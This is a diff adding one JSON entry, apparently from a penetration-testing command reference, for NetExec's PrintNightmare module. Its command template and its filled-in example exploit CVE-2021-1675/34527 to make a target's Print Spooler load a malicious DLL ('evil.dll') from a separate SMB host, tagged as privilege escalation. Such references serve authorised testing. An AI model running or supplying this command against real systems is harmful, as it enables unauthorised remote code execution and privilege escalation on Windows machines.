@@ -1,0 +1,25 @@
+{
+  "id": "nxc-smb-printnightmare",
+  "name": "NetExec SMB PrintNightmare",
+  "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M printnightmare -o DLL='\\\\<ip>\\share\\evil.dll'",
+  "description": "Exploit PrintNightmare (CVE-2021-1675/34527) to load a malicious DLL via the Print Spooler service",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "smb"
+  ],
+  "tags": [
+    "nxc",
+    "smb",
+    "printnightmare",
+    "cve-2021-1675",
+    "cve-2021-34527",
+    "print-spooler",
+    "privilege-escalation"
+  ],
+  "examples": [
+    "nxc smb '192.168.1.100' -u 'user' -p 'password' -M printnightmare -o DLL='\\\\\\\\192.168.1.50\\\\share\\\\evil.dll'"
+  ]
+}
